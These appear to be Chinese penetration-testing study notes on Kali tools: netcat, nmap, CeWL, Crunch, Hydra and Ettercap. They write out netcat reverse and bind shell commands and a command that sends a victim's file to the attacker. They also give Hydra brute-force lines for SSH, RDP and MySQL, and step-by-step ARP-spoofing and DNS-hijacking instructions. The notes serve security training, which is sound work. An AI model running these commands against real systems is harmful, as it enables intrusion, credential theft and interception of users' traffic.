## 1.渗透专用系统简介
kali、Cyborg Hawk、Parrot Security OS、Bavkbox Linux等等

渗透测试最常用的还是kali

## 2.kali
切换root  sudo su

集合了好多好用的安全工具

kali系统默认用户名及密码（包括root）都是kali

**kali汉化：**

**设置语言包		sudo dpkg-reconfigure locales  **

选中zh_CN UTF-8

重启生效汉化

**更改镜像源：**/etc/apt/sources.list  配置文件   使用进行更新等操作时网速等快更好用

vi /etc/apt/sources.lis

中科大：  
deb [http://mirrors.ustc.edu.cn/kali](http://mirrors.ustc.edu.cn/kali) kali-rolling main non-free contrib

deb-src [http://mirrors.ustc.edu.cn/kali](http://mirrors.ustc.edu.cn/kali) kali-rolling main non-free contrib

阿里云:  
deb [http://mirrors.aliyun.com/kali](http://mirrors.aliyun.com/kali) kali-rolling main non-free contrib

deb-src [http://mirrors.aliyun.com/kali](http://mirrors.aliyun.com/kali) kali-rolling main non-free contrib

清华大学：  
deb [http://mirrors.tuna.tsinghua.edu.cn/kali](http://mirrors.tuna.tsinghua.edu.cn/kali) kali-rolling main contrib non-free

deb-src [https://mirrors.tuna.tsinghua.edu.cn/kali](https://mirrors.tuna.tsinghua.edu.cn/kali) kali-rolling main contrib non-free

**更新软件数据库：sudo apt-get update**

**更新软件：sudo apt-get upgrade**

修改缩放比例：搜索并点击hidp

## 3.netcat的使用
NC、网络工具的瑞士军刀  主负责通信等

nc -h 终端输入 出相关参数

nc -lnvp 8888 攻击者终端输入   8888是端口   1-65535  部分端口号是常用端口号易被占用  ctrl+c可断开

nc ip攻击者地址 攻击者端口  受害者终端输入  两者即可通信

两个机器要在同一局域网

不在的情况下需要  反弹shell（反向shell）

同一局域网无法通信？

需要关闭防火墙  对外不对内

service firewalld status  查看防火墙状态  黑色代表防火墙关闭状态  绿色代表开启状态

sudo systemctl stop firewalld  关闭防火墙

sudo systemctl disable firewalld		永久关闭

传输文件内容：客户端将本地的1.txt发送到服务端1.txt里面 服务端名字随意后缀建议一样  包含敏感信息的文件可直接传送回来

攻击者（服务端）： nc -lvp 端口号 > 1.txt

受害者（客户端）： nc ip(服务端) 端口号 < 1.txt

**获取shell**

获取shell分为两种，一种是正向shell，一种是反向shell。如果客户端连接服务器端，想要获取服务器端的shell，攻击者主动连接受害者，那么称为正向shell，如果是客户端连接服务器,服务器端想要获取客户端的shell，受害者主动连接攻击者，那么称为反向shell。

在装有nc的前提下

正向：服务端获取客户端shell

客户端：nc -e /bin/sh -lvp 端口号  Linux

&#x9;			nc -e cmd -lvp 端口号  window

服务端：nc ip地址（客户端） 端口

反向：通过入侵web后入侵web服务器 利用web公网ip的唯一性

服务端： nc -lvvp 端口号

客户端： nc -e /bin/sh ip（服务端） 端口   Linux

&#x9;			nc -e cmd ip(服务端)  端口   window

php python Java c c++

反弹shell生成器：[https://forum.ywhack.com/reverse-shell/](https://forum.ywhack.com/reverse-shell/)

对于客户端Linux可以使用bash   Linux特有

[nc.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/59258918/1755351284499-cdd64af8-96da-4c27-a656-ee39548abcd0.zip)

## 4.nmap
原理：类似通过对ip的端口不断ping，来确认状态

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755252421823-df803b5d-de98-4718-a933-07f518b2af5f.png)

nmap -h

nmap ip（客户端）扫描客户端端口

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755262685226-d9d1f241-b183-4642-bafc-ba547eacc198.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755262937904-e4bdde5d-3831-4c67-9e9b-35907bf9fd12.png)

[nmap命令详解.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/59258918/1755262973760-2297e0e1-4ce3-4dc4-aa87-0432d0d29d06.txt)

[nmap命令.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/59258918/1755262973825-ee1139dc-aef5-492d-b6dc-2344cd0cd737.txt)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755263178609-88f06f49-52f2-41a2-8aba-3272d2b95f7a.png)

nmap脚本扩展：[https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html](https://wooyun.js.org/drops/nmap%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html)



## 5.ssh登录
LInux远程登陆   3389远程桌面  windows



apt-get install ssh  kali安装ssh  	kali Linux系统一般自行带有

serveice ssh status 查看状态

service ssh start  开启ssh服务

修改配置文件内容：/etc/ssh/sshd_config

vi编辑

参数更改：

删除PasswordAuthentication前面的#

在PermitRootLogin  prohibit-password修改为PermitRootLogin yes（删除#）



service ssh restart  重启ssh服务

[FinalShell_4.0.1_Green.7z](https://www.yuque.com/attachments/yuque/0/2025/7z/59258918/1755351251937-432a33cb-d5fe-4fb6-8535-5187f05a1bcb.7z)

## 6.字典
生成思路

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755329435271-1507dd9e-d4b9-4518-b3d7-859c9492efd3.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755329472286-0ed9dfd1-eff9-4960-93e9-22997bc22694.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755329500449-2ddb2599-bc15-46b3-8b73-713f3ee83a2f.png)

## 7.Cewl
![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755329549458-3cabfa97-93fa-4c2b-ad42-eadecef0b98c.png)

kali自带

cewl -h  查看Cewl的参数help

url地址  网址

www.vulnweb.com 靶场

cewl 网址 爬取网站关键词

cewl 网址  -w  文件名  爬取该网址关键字并保存在该文件

cewl 网址 -m 数字 爬取并生成至少字长的关键字

cewl 网址 -e -n	检索并爬取指定网站的邮箱

cewl 网址 -c 爬取并标注关键字出现次数

cewl 网址 -d 数字	以数字深度爬取网站 默认是2 越深消息越多时间越长

cewl 网址 -v  爬取并展示爬取时的详细信息

cewl 网址 --with-numbers 爬取并生成混有数字的关键字

cewl 网址 --auth_type basic --auth_user 用户名 -auth_pass 密码 -v 遇见登录框时会登录再爬取 

具有摘要/基本身份验证

-auth_type: 	Digest/Basic(文本类型/基本类型)

-auth_user: 	Authentication Username(用户名)

-auth_pass: 	Authentication password(密码)

cewl 网址 --proxy_host 127.0.0.1 --proxy_port 端口 支持代理服务器（代理布置再本机kali时）

cewl 网址 --proxy_host ip --proxy_port 端口 支持代理服务器（代理布置在其他机器时）

## 8.Crunch
![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349327549-34c784b8-ed3e-4398-b828-dc642496224e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349365703-d74236a4-e9e4-4a25-9b10-ed2d92a2c777.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755349390287-834e0e15-13d7-48dc-93cb-4777af9903de.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755350254231-2a122b3c-9fcd-408a-9500-504d1cad47b4.png)

crunch 2 4 -o 1.txt

crunch 6 6 123 -o 1.txt 生成由123组成的六位字典存到1.txt

crunch 1 1 -q 文件名 -o 1.txt 基于文件生成一份字典存到1.txt 在使用-q时前两位参数无效可任意填写

crunch 4 4 -t ,%^@ 生成指定格式的字典

/usr/share/crunch 中存放着自带的密码集 charset .lst

crunch 1 3 -f /usr/share/crunch/charset.lst 模块（charset.lst中的） 调用密码库模块为字符集生成3位字典

## 9.Xhydra 九头蛇 登录爆破神器
爆破各种协议登录

[常见端口的攻击思路.docx](https://www.yuque.com/attachments/yuque/0/2025/docx/59258918/1755351319412-0e93d0d4-0523-4e68-8101-2caa5b9ea9be.docx)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755351376030-9fd1b897-14e3-4017-97dd-a06d55c60bdc.png)

[fuzzDicts-master.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/59258918/1755352795159-d1b688b7-ba37-45f5-87ac-88416ba79798.zip)

小写l与p是指定用户名/密码（常用于已知） 区分大小写

在指定目录下（存有要用的字典）

hydra -l root -P 字典 ssh：//IP（客户端）使用root用户名和该字典作为密码对客户端进行ssh协议爆破

ssh 用户名@ip（客户端） 	在kali命令行对客户端进行ssh登录

hydra -l root -P 字典 rdp：//IP（客户端）windows 会调用xfreerdp（要检查是否正常工作，更换镜像、更新软件）

hydra -l root -P 字典 mysql：//IP（客户端）	爆破mysql mysql默认用户名是root

Mysql默认不允许远程登录 	

在sql管理器中输入GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; 	FLUSH PRIVILEGES; 并运行

在sql配置文件输入max_connect_errors=10000

在kali终端输入xhydra 唤出图形化xhydra工具

windows用的爆破工具

[超级弱口令检查工具V1.0 Beta28 20190715.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/59258918/1755358356973-bb9aae2e-ad9d-4b23-8d16-7a6df1d1db06.zip)



## 10.ettercap
![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755516156647-4e2fc63d-b0a8-47a3-8f35-9d92388e7c5e.png)

mac地址 每台pc唯一 烧录在内存 无法更改 对应的IP 唯一性

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525898935-f5e1d702-855e-4c03-86fd-d75727be2787.png)

arp -a cmd命令 arp表 表明ip对应的mac

arp中间人攻击   前提在同一个局域网

+ A 需要向 B 发送数据包（比如访问互联网），但 A 并不直接与 B 通信，而是通过 **ARP** 查找 B 的 MAC 地址（通过广播）。
+ 攻击者 C 假装自己是 B，把 A 的数据包截下来，进行篡改、记录，甚至丢弃。

ettercap -g 直接唤醒ettercap图形化页面

在primary interface 选择网卡 选择要和受害者在同一局域网的网卡

点击对勾开始运行

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525291067-83f07a69-1fdc-4b00-9283-9559776f92cc.png)

确定客户端mac地址  通过arp表  查看网关对应的 物理地址

点击scan for hosts 放大镜开始扫描

点击Host list列表查看

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525330777-7ef9cb14-0b7b-42c1-81f1-998690d0d5c7.png)

攻击者模仿网关

选择后加入 Add to Target 1

客户端对应，选择后加入Add to Target2

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525411304-66927045-7e29-4068-878a-a036ff110a54.png)

点击右上角地球圆圈，选择arp

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525530445-f7c58eca-a62a-475e-b84b-f4ed5bed760c.png)

选择ok 开启arp欺骗

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755525936020-1628c56b-84f4-4013-b8dc-ba55b5047a92.png)

客户端登陆网站，会被截下显示用户名密码一类的

http没有进行加密传播 https加密传播



重点是arp中间人攻击原理 这个工具用的少

前提条件是连入同一局域网，但连入同一局域网后，有更好用的其他方法



DNS劫持

DNS是用来解析域名

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755583847195-0c5b16b5-2ada-4707-979a-85859efdbf3d.png)

DNS劫持 将域名和对应ip进行更改，将数据包传送到其他地方 

在本地应搭建一个网站 在本地有apache服务就行 在kali上通过访问127.0.0.1进行访问本地网站  在同一局域网下其他电脑通过访问该kali的ip同样可以访问 一般是apache中间件页面

kali最新系统有中间件apache环境 可通过 service apache2 status 来查看运行

通过 service apache2 start 开启apache服务

访问网站就是访问web服务器对应的文件夹 kali下的根目录默认是 /var/www/html

[aaa.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/59258918/1755585549803-98b6dc18-94f9-44c2-9bbb-8d43f90ac551.zip)

可在远程登录软件finalshell中登陆后使用rz进行文件传输

unzip 文件名（带.zip后缀） 在linux中解压zip文件

输入 ip（kali）/aaa 可访问到该网站

vi /etc/ettercap/etter.dns	 编辑etter.dns文件

输入  www.*.com A ip（kali）/aaa  	A代表DNS的A记录  客户端访问任何以www.开头同时以.com结尾的网站 都会跳转到kali本地的aaa网站

编辑文件完成后重启再次配置启动ettercap 跟上面步骤一样

然后点击右上角3个点，选择Plugins（插件）

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755586390737-fe14ea6e-7621-4337-bb28-d281c68cca92.png)

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755586414097-6e31804b-b15a-4a9a-88c9-a009f2ade761.png)

选择第一个

![](https://cdn.nlark.com/yuque/0/2025/png/59258918/1755586437672-fb38c660-87f2-4722-929e-e330ee742e99.png)

点击dns_spoof 双击 前面会出现*代表启动



